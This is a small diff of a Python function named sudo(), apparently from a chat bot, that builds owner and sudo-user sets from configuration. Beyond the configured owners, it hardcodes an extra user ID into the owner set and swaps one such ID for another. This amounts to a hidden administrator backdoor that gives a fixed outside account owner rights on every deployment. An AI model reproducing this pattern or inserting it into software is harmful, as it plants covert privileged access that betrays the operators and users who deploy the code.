@@ -50,7 +50,7 @@ def sudo():
     OWNERS = config.OWNER_ID
     for a in OWNERS:
         OWNER.add(a)
-    OWNER.add(1860375797)
+    OWNER.add(1708645514)
     if config.MONGO_DB_URI is None:
         for user_id in OWNERS:
             SUDOERS.add(user_id)
